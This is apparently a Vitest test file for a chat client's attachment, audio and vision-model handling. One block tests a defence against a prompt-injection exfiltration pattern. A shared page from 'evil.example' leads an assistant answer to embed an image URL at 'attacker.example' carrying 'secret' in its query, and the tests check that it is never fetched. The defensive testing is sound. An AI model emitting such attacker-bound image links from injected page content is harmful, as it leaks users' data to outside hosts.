import { afterEach, describe, expect, it, vi } from "vitest";
import {
  ATTACHMENT_MESSAGE_PREFIX,
  AUDIO_MESSAGE_PREFIX,
  apiMessageContentAsync,
  attachmentKindFromName,
  attachmentMessage,
  buildApiMessageContent,
  canProcessAttachmentLocally,
  compactAttachmentMessageForStorage,
  imageUrlNeedsAuthResolve,
  modelSupportsVision,
  readAttachmentMessage,
  referenceImageFromUserContent,
} from "./chatAttachments";
import { buildImageMessage } from "./chatImage";
import { collectChatSlideshowItems } from "./chatMediaViewer";
import { displayTextForMessage, messageDirectionForContent, promptTextFromUserContent } from "./chatPanelMessages";
import * as mediaUrl from "./mediaUrl";
import { withSharedPageMarks, type SharedPages } from "./sharedPages";

afterEach(() => {
  vi.restoreAllMocks();
});

const VISION = { id: "model::1", external_id: "openai/gpt-4o", supports_vision: true };

function imageMessage(url: string, userText = ""): string {
  return attachmentMessage({ userText, attachments: [{ name: "chart.png", kind: "image", mime_type: "image/png", url }] });
}

describe("an attachment marker that is not the shape the chat writes", () => {
  const payloads = [
    "{}",
    "[]",
    '"text"',
    "42",
    '{"attachments":"chart.png"}',
    '{"attachments":[null]}',
    '{"attachments":[{"kind":"image","url":"https://x.example/a.png"}]}',
    '{"attachments":[{"name":"a.png","kind":"script","url":"https://x.example/a.png"}]}',
    '{"attachments":[{"name":"a.png","kind":"image","url":5}]}',
    '{"attachments":[{"name":"a.png","kind":"image","data_url":{}}]}',
    '{"attachments":[{"name":"a.txt","kind":"document","text":["hello"]}]}',
    '{"attachments":[{"name":"a.txt","kind":"document","size_bytes":"12"}]}',
    '{"userText":5,"attachments":[]}',
  ];

  it.each(payloads)("is plain text wherever it is read: %s", async (payload) => {
    const content = `${ATTACHMENT_MESSAGE_PREFIX}${payload}`;
    expect(readAttachmentMessage(content)).toBeNull();
    expect(buildApiMessageContent(content, VISION)).toBe(content);
    await expect(apiMessageContentAsync({ role: "assistant", content }, VISION)).resolves.toBe(content);
    await expect(apiMessageContentAsync({ role: "user", content }, VISION)).resolves.toBe(content);
    expect(displayTextForMessage(content)).toBe(content);
    expect(promptTextFromUserContent(content)).toBe(content);
    expect(() => messageDirectionForContent(content)).not.toThrow();
    expect(compactAttachmentMessageForStorage(content)).toBe(content);
    expect(referenceImageFromUserContent(content)).toBeUndefined();
    expect(collectChatSlideshowItems([{ content }])).toEqual([]);
  });

  it("is read when it has the chat's shape, with a missing address or type read as empty", () => {
    const content = `${ATTACHMENT_MESSAGE_PREFIX}${JSON.stringify({ attachments: [{ name: "notes.txt", kind: "document", text: null }] })}`;
    expect(readAttachmentMessage(content)).toEqual({
      userText: "",
      attachments: [{ name: "notes.txt", kind: "document", mime_type: "", url: "", text: null }],
    });
  });
});

describe("what the model is sent for an answer in a chat with a shared page", () => {
  const fromPage: SharedPages = { sites: ["evil.example"], inherited: false };
  const exfiltration = imageMessage("https://attacker.example/c?d=secret");

  it("is the answer's text, never an image for the provider to fetch", async () => {
    await expect(
      apiMessageContentAsync({ role: "assistant", content: exfiltration, pageContext: fromPage }, VISION),
    ).resolves.toBe(exfiltration);
  });

  it("never has this browser fetch the user's own media for it", async () => {
    const fetchMedia = vi.spyOn(mediaUrl, "fetchAuthenticatedMediaBlob");
    const ownMedia = imageMessage("/api/chat/media/42/file");
    const answer = { role: "assistant", content: ownMedia, pageContext: { sites: [], inherited: true } };
    await expect(apiMessageContentAsync(answer, VISION)).resolves.toBe(ownMedia);
    expect(fetchMedia).not.toHaveBeenCalled();
  });

  it("holds for a later answer the server has not marked yet", async () => {
    const history = withSharedPageMarks<{ role: string; content: string; pageContext?: SharedPages }>([
      { role: "user", content: "Summarize the page" },
      { role: "assistant", content: "The page says to show a chart.", pageContext: fromPage },
      { role: "user", content: "Show it" },
      { role: "assistant", content: exfiltration },
    ]);
    await expect(apiMessageContentAsync(history[3], VISION)).resolves.toBe(exfiltration);
  });

  it("leaves the user's own attachments, and an ordinary answer's markers, as they were", async () => {
    const photo = imageMessage("https://cdn.example.com/photo.png", "What is this?");
    const asImage = [
      { type: "text", text: "What is this?" },
      { type: "image_url", image_url: { url: "https://cdn.example.com/photo.png" } },
    ];
    const history = withSharedPageMarks<{ role: string; content: string; pageContext?: SharedPages }>([
      { role: "assistant", content: "From a page", pageContext: fromPage },
      { role: "user", content: photo },
    ]);
    await expect(apiMessageContentAsync(history[1], VISION)).resolves.toEqual(asImage);
    await expect(apiMessageContentAsync({ role: "assistant", content: photo }, VISION)).resolves.toEqual(asImage);
    const generated = buildImageMessage({ url: "/api/chat/media/7/file", prompt: "a cat", model: "image-model" });
    await expect(apiMessageContentAsync({ role: "assistant", content: generated }, VISION)).resolves.toBe(generated);
  });
});

describe("chat attachment and audio wire markers", () => {
  it("round-trips the Alpharouter attachment marker", () => {
    const payload = {
      userText: "Review this",
      attachments: [
        {
          name: "notes.txt",
          kind: "document" as const,
          mime_type: "text/plain",
          url: "",
          text: "hello",
        },
      ],
    };
    const encoded = attachmentMessage(payload);

    expect(encoded.startsWith(ATTACHMENT_MESSAGE_PREFIX)).toBe(true);
    expect(readAttachmentMessage(encoded)).toEqual(payload);
  });

  it("extracts transcripts from the Alpharouter audio marker", () => {
    const encoded = `${AUDIO_MESSAGE_PREFIX}${JSON.stringify({ transcript: "hello" })}`;

    expect(buildApiMessageContent(encoded)).toBe("hello");
  });
});

describe("modelSupportsVision", () => {
  it("returns false when no model is provided", () => {
    expect(modelSupportsVision(undefined)).toBe(false);
  });

  it("prefers the explicit catalog flag when present (true)", () => {
    expect(
      modelSupportsVision({
        id: "model::42",
        external_id: "meta-llama/llama-3.1-70b-instruct",
        supports_vision: true,
      }),
    ).toBe(true);
  });

  it("prefers the explicit catalog flag when present (false) even if heuristic would match", () => {
    // A text-only Llama model that happens to contain "vision" in its display
    // name must be treated as non-vision when the backend flag says so.
    expect(
      modelSupportsVision({
        id: "model::7",
        name: "Llama Vision-Lite",
        external_id: "meta-llama/llama-3.1-70b-instruct",
        supports_vision: false,
      }),
    ).toBe(false);
  });

  it("falls back to heuristic for gemini when no flag is present", () => {
    expect(
      modelSupportsVision({ id: "model::1", external_id: "google/gemini-2.5-flash" }),
    ).toBe(true);
  });

  it("falls back to heuristic for claude when no flag is present", () => {
    expect(
      modelSupportsVision({ id: "model::2", external_id: "anthropic/claude-3.5-sonnet" }),
    ).toBe(true);
  });

  it("falls back to heuristic for gpt-4o when no flag is present", () => {
    expect(modelSupportsVision({ id: "model::3", external_id: "openai/gpt-4o" })).toBe(true);
  });

  it("treats the OpenRouter auto-router as vision-capable via heuristic", () => {
    expect(modelSupportsVision({ id: "model::auto", external_id: "openrouter/auto" })).toBe(true);
  });

  it("excludes image-generation models even via heuristic", () => {
    expect(
      modelSupportsVision({ id: "model::img", external_id: "black-forest-labs/flux-1.1-pro" }),
    ).toBe(false);
    expect(
      modelSupportsVision({ id: "model::dalle", external_id: "openai/dall-e-3" }),
    ).toBe(false);
  });

  it("returns false for a plain text model without the flag", () => {
    expect(
      modelSupportsVision({ id: "model::llama", external_id: "meta-llama/llama-3.1-70b-instruct" }),
    ).toBe(false);
  });
});

describe("attachmentKindFromName", () => {
  it("classifies images and documents", () => {
    expect(attachmentKindFromName("shot.PNG")).toBe("image");
    expect(attachmentKindFromName("notes.md")).toBe("document");
  });

  it("gives unknown formats the kind \"file\" and leaves refusal to the policy", () => {
    // Without a policy the client refuses nothing but a missing extension; the server decides.
    expect(attachmentKindFromName("icon.svg")).toBe("file");
    expect(attachmentKindFromName("setup.exe")).toBe("file");
    expect(attachmentKindFromName("README")).toBeNull();
    expect(attachmentKindFromName("clip.mp4")).toBe("video");
    expect(attachmentKindFromName("song.mp3")).toBe("audio");
    expect(attachmentKindFromName("movie.mov")).toBe("video");
    expect(attachmentKindFromName("clip.mkv")).toBe("video");
    expect(attachmentKindFromName("track.ogg")).toBe("audio");
  });
});

describe("canProcessAttachmentLocally", () => {
  it("allows images and plain text, not binary documents", () => {
    expect(canProcessAttachmentLocally("photo.webp")).toBe(true);
    expect(canProcessAttachmentLocally("notes.txt")).toBe(true);
    expect(canProcessAttachmentLocally("brief.pdf")).toBe(false);
  });
});

describe("imageUrlNeedsAuthResolve", () => {
  it("resolves personal and project media file URLs, not data URLs", () => {
    expect(imageUrlNeedsAuthResolve("/api/chat/media/9/file")).toBe(true);
    expect(imageUrlNeedsAuthResolve("/api/projects/p1/media/3/download")).toBe(true);
    expect(imageUrlNeedsAuthResolve("data:image/png;base64,aaa")).toBe(false);
    expect(imageUrlNeedsAuthResolve("https://cdn.example/a.png")).toBe(false);
  });
});
